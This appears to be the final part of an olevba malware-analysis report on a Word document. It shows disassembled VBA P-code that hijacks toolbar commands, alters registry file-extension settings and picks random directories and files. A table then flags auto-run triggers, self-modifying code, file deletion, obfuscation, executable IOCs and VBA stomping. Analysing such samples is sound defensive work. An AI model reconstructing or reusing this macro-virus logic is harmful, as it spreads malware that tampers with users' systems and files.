' 	LitStr 0x0000 ""
' 	Ld Key 
' 	LitStr 0x0005 "\.doc"
' 	Concat 
' 	LitStr 0x0000 ""
' 	ArgsMemLdWith PrivateProfileString 0x0003 
' 	St S 
' Line #463:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0007 
' 	For 
' Line #464:
' 	Ld S 
' 	LitStr 0x0000 ""
' 	Ld Key 
' 	LitStr 0x0002 "\."
' 	Concat 
' 	Ld i 
' 	ArgsLd Ext 0x0001 
' 	Concat 
' 	LitStr 0x0000 ""
' 	ArgsMemStWith PrivateProfileString 0x0003 
' Line #465:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #466:
' 	LitStr 0x0000 ""
' 	Ld Key 
' 	LitStr 0x0005 "\.wbk"
' 	Concat 
' 	LitStr 0x0000 ""
' 	ArgsMemLdWith PrivateProfileString 0x0003 
' 	St S 
' Line #467:
' 	Ld S 
' 	LitStr 0x0000 ""
' 	Ld Key 
' 	LitStr 0x0005 "\.bak"
' 	Concat 
' 	LitStr 0x0000 ""
' 	ArgsMemStWith PrivateProfileString 0x0003 
' Line #468:
' 	EndWith 
' Line #469:
' 	EndSub 
' Line #470:
' 	FuncDefn (Private Sub SMHk(CBName As String, CID As Long, ProcName As String))
' Line #471:
' 	Dim 
' 	VarDefn A (As CommandBar)
' 	VarDefn B (As CommandBarControl)
' Line #472:
' 	OnError (Resume Next) 
' Line #473:
' 	SetStmt 
' 	Ld CBName 
' 	ArgsLd CommandBars 0x0001 
' 	Set A 
' Line #474:
' 	SetStmt 
' 	Ld msoControlButton 
' 	ParamNamed TypeOf 
' 	Ld CID 
' 	ParamNamed ID 
' 	Ld A 
' 	ArgsMemLd FindControl 0x0002 
' 	Set B 
' Line #475:
' 	Ld B 
' 	LitNothing 
' 	Is 
' 	Not 
' 	If 
' 	BoSImplicit 
' 	Ld B 
' 	MemLd OnAction 
' 	Ld ProcName 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld ProcName 
' 	Ld B 
' 	MemSt OnAction 
' 	EndIf 
' 	EndIf 
' Line #476:
' 	StartForVariable 
' 	Ld A 
' 	EndForVariable 
' 	Ld CommandBars 
' 	ForEach 
' Line #477:
' 	SetStmt 
' 	Ld msoControlButton 
' 	ParamNamed TypeOf 
' 	Ld CID 
' 	ParamNamed ID 
' 	Ld A 
' 	ArgsMemLd FindControl 0x0002 
' 	Set B 
' Line #478:
' 	Ld B 
' 	LitNothing 
' 	Is 
' 	Not 
' 	If 
' 	BoSImplicit 
' 	Ld B 
' 	MemLd OnAction 
' 	Ld ProcName 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld ProcName 
' 	Ld B 
' 	MemSt OnAction 
' 	EndIf 
' 	EndIf 
' Line #479:
' 	StartForVariable 
' 	Ld A 
' 	EndForVariable 
' 	NextVar 
' Line #480:
' 	EndSub 
' Line #481:
' 	FuncDefn (Private Function RDr(ByVal Path As String, id_FFFE As String) As String)
' Line #482:
' 	Dim (Const) 
' 	LitStr 0x0003 "*.*"
' 	VarDefn Maska
' Line #483:
' 	Dim 
' 	VarDefn Buf (New As Collection)
' Line #484:
' 	Dim 
' 	VarDefn FindName (As String)
' Line #485:
' 	Ld Path 
' 	LitDI2 0x0001 
' 	ArgsLd Right 0x0002 
' 	LitStr 0x0001 "\"
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld Path 
' 	LitStr 0x0001 "\"
' 	Concat 
' 	St Path 
' 	EndIf 
' Line #486:
' 	OnError Errs 
' Line #487:
' 	Ld Path 
' 	LitDI2 0x0017 
' 	ArgsLd Dir 0x0002 
' 	St FindName 
' Line #488:
' 	Ld FindName 
' 	FnLen 
' 	LitDI2 0x0000 
' 	Ne 
' 	DoWhile 
' Line #489:
' 	Ld Path 
' 	Ld FindName 
' 	Concat 
' 	ArgsLd GetAttr 0x0001 
' 	Ld vbDirectory 
' 	And 
' 	Paren 
' 	Ld vbDirectory 
' 	Eq 
' 	IfBlock 
' Line #490:
' 	Ld FindName 
' 	LitDI2 0x0001 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0001 "."
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld FindName 
' 	Ld Buf 
' 	ArgsMemCall Add 0x0001 
' 	EndIf 
' Line #491:
' 	EndIfBlock 
' Line #492:
' 	Ld Dir 
' 	St FindName 
' Line #493:
' 	Loop 
' Line #494:
' 	Ld Path 
' 	Ld Buf 
' 	MemLd Count 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	ArgsLd Buf 0x0001 
' 	Concat 
' 	ArgsLd UCase 0x0001 
' 	St RDr 
' Line #495:
' 	Label Errs 
' Line #496:
' 	Ld Buf 
' 	MemLd Count 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0000 ""
' 	St RDr 
' 	EndIf 
' Line #497:
' 	EndFunc 
' Line #498:
' 	FuncDefn (Private Function RnDr(ByVal Path As String, id_FFFE As String) As String)
' Line #499:
' 	Dim 
' 	VarDefn tmp (As String)
' Line #500:
' 	Dim 
' 	VarDefn i (As Integer)
' Line #501:
' 	Dim 
' 	VarDefn GetRandom (As Integer)
' Line #502:
' 	Dim 
' 	VarDefn RandStep (As Integer)
' Line #503:
' 	LitDI2 0x03E9 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St GetRandom 
' Line #504:
' 	LitDI2 0x0000 
' 	St RandStep 
' Line #505:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x000A 
' 	For 
' Line #506:
' 	Ld Path 
' 	ArgsLd RDr 0x0001 
' 	St tmp 
' Line #507:
' 	Ld tmp 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld tmp 
' 	St Path 
' 	EndIf 
' Line #508:
' 	Ld tmp 
' 	LitStr 0x0000 ""
' 	Eq 
' 	Paren 
' 	Ld i 
' 	LitDI2 0x0001 
' 	Eq 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #509:
' 	LitStr 0x0000 ""
' 	St RnDr 
' Line #510:
' 	ExitFunc 
' Line #511:
' 	EndIfBlock 
' Line #512:
' 	Ld tmp 
' 	LitStr 0x0000 ""
' 	Eq 
' 	Paren 
' 	Ld i 
' 	LitDI2 0x0001 
' 	Ne 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #513:
' 	Ld Path 
' 	LitStr 0x0001 "\"
' 	Concat 
' 	St RnDr 
' Line #514:
' 	ExitFunc 
' Line #515:
' 	EndIfBlock 
' Line #516:
' 	Ld RandStep 
' 	SelectCase 
' Line #517:
' 	LitDI2 0x0000 
' 	LitDI2 0x00C8 
' 	CaseTo 
' 	CaseDone 
' Line #518:
' 	Ld RandStep 
' 	LitDI2 0x00C8 
' 	Add 
' 	St RandStep 
' Line #519:
' 	LitDI2 0x0190 
' 	LitDI2 0x0258 
' 	CaseTo 
' 	CaseDone 
' Line #520:
' 	Ld RandStep 
' 	LitDI2 0x0064 
' 	Add 
' 	St RandStep 
' Line #521:
' 	LitDI2 0x02BC 
' 	LitDI2 0x0384 
' 	CaseTo 
' 	CaseDone 
' Line #522:
' 	Ld RandStep 
' 	LitDI2 0x0032 
' 	Add 
' 	St RandStep 
' Line #523:
' 	EndSelect 
' Line #524:
' 	Ld RandStep 
' 	Ld GetRandom 
' 	Ge 
' 	IfBlock 
' Line #525:
' 	Ld Path 
' 	LitStr 0x0001 "\"
' 	Concat 
' 	St RnDr 
' Line #526:
' 	ExitFunc 
' Line #527:
' 	EndIfBlock 
' Line #528:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #529:
' 	EndFunc 
' Line #530:
' 	FuncDefn (Private Function RFe(ByVal Path As String, Maska As String, id_FFFE As String) As String)
' Line #531:
' 	Dim 
' 	VarDefn Buf (New As Collection)
' Line #532:
' 	Dim 
' 	VarDefn FindName (As String)
' Line #533:
' 	Ld Path 
' 	Ld Maska 
' 	Concat 
' 	St Path 
' Line #534:
' 	OnError Errs 
' Line #535:
' 	Ld Path 
' 	LitDI2 0x0007 
' 	ArgsLd Dir 0x0002 
' 	St FindName 
' Line #536:
' 	Ld FindName 
' 	FnLen 
' 	LitDI2 0x0000 
' 	Ne 
' 	DoWhile 
' Line #537:
' 	Ld FindName 
' 	Ld Buf 
' 	ArgsMemCall Add 0x0001 
' Line #538:
' 	Ld Dir 
' 	St FindName 
' Line #539:
' 	Loop 
' Line #540:
' 	Ld Buf 
' 	MemLd Count 
' 	Ld Rnd 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	ArgsLd Buf 0x0001 
' 	ArgsLd UCase 0x0001 
' 	St RFe 
' Line #541:
' 	Label Errs 
' Line #542:
' 	Ld Buf 
' 	MemLd Count 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0000 ""
' 	St RFe 
' 	EndIf 
' Line #543:
' 	EndFunc 
' Line #544:
' 	FuncDefn (Private Sub xxx())
' Line #545:
' 	EndSub 
' Line #546:
' Line #547:
' Line #548:
' Line #549:
' Line #550:
' Line #551:
' Line #552:
' Line #553:
' Line #554:
' Line #555:
' Line #556:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Put                 |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Binary              |May read or write a binary file (if combined |
|          |                    |with Open)                                   |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |VBADLG.DLL          |Executable file name                         |
|IOC       |Regedit.exe         |Executable file name                         |
|IOC       |RUNDLL.EXE          |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

